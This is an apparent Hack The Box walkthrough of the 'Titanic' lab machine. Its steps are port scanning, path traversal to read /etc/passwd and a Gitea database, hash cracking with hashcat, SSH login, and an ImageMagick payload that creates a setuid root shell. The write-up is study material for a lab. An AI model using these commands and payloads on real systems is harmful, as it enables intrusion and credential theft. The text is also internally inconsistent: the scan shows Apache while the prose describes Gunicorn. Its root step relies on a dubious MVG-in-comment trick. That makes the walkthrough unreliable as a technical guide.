# Titanic – HTB Walkthrough

## 🧭 Enumeration
We begin by scanning the open ports on the host:

```bash
nmap -sS -p- 10.10.11.55 -T5
```

Output:

PORT     STATE SERVICE  
22/tcp   open  ssh  
80/tcp   open  http  

Port 80 running an HTTP service and port 22 (SSH) are open on the target.

⸻

🔍 Service Detection on Port 80

```bash
nmap -sV -p 80 10.10.11.55 -T5
```

Output:

80/tcp open  http    Apache httpd 2.4.52

Gunicorn is a Python WSGI HTTP server, often used to serve Flask apps.  
Browsing the website (after adding `titanic.htb` to your `/etc/hosts`) reveals a landing page for booking ship trips.

⸻

🧪 Web Application & LFI

The website features a booking form which, when submitted, generates a JSON file via a redirect to:

```
/download?ticket=<ticket_id>.json
```

Testing for LFI by replacing the `ticket` parameter yields:

```bash
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
```

Which returns the contents of `/etc/passwd`.

Similarly, accessing:

```bash
curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
```

Returns:

```
1675dbe3cc3d3ab35d0e5db3bb8e8679
```

→ ✅ User flag obtained.

Fuzzing the `/download` endpoint (using `ffuf`) confirms directory traversal and file disclosure on various sensitive files (e.g., crontab, passwd, etc.).

⸻

🔍 Gitea Enumeration & Database Extraction

Accessing the subdomain `dev.titanic.htb` reveals a Gitea instance.  
Two repositories are of interest:
- `docker-config`
- `flask-app`

In the `docker-config` repo, a Docker Compose file for MySQL is found:

```yaml
version: '3.8'
services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

Furthermore, a Docker Compose file for Gitea reveals the path of the database:

```
/home/developer/gitea/data/gitea/gitea.db
```

Using the LFI vulnerability, the file is downloaded:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

Opening the database with `sqlite3` reveals the user table. Extracting the credentials of the developer user:

```sql
SELECT lower_name, salt, passwd FROM user;
```

Hash and salt values are obtained, converted (e.g., with `gitea2hashcat`) and cracked with hashcat:

```bash
hashcat -m 10900 hash.txt rockyou.txt
```

→ developer: `25282528`

⸻

🔐 SSH Access as Developer

With the cracked credentials:

```bash
ssh developer@titanic.htb
```

Once logged in, enumeration confirms access to `/opt/scripts`, where a script stands out.

⸻

🧪 ImageMagick Exploit & identify_images.sh

In `/opt/scripts`, the script `identify_images.sh` is found:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This script uses `magick identify` to process `.jpg` images and extract metadata.

To trigger RCE via ImageMagick:
1. Craft a JPEG file with:
   - JPEG magic bytes (FF D8 ...)
   - An MVG payload embedded in a comment
   - JPEG trailer (FF D9)

Example:
```bash
magick convert -size 640x480 xc:white -set comment "push graphic-context
viewbox 0 0 640 480
fill 'url(|cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash|)'
pop graphic-context" evil.jpg
```

Drop `evil.jpg` in the image directory and wait for the script to execute (e.g., via cron).

Then:
```bash
/tmp/rootbash -p
```

→ Root shell obtained ✅

⸻

🏁 Summary

| Step          | Description                                              |
|---------------|----------------------------------------------------------|
| nmap          | Enumerate ports (SSH on 22, HTTP on 80)                  |
| Web           | Discover booking form & LFI on `/download?ticket=`      |
| LFI           | Extract `/etc/passwd`, `/home/developer/user.txt`       |
| Gitea         | Extract and crack developer credentials from gitea.db   |
| SSH           | SSH access as `developer`                               |
| ImageMagick   | Craft malicious JPEG to gain root via identify script   |

🎉 Rooted!

⸻

🧠 Lessons Learned
- LFI vulnerabilities can expose sensitive files and escalate quickly.
- Misconfigurations (like Docker/Gitea exposure) are critical entry points.
- ImageMagick has a history of dangerous parsing bugs.
- File extension ≠ file type — magic bytes matter.
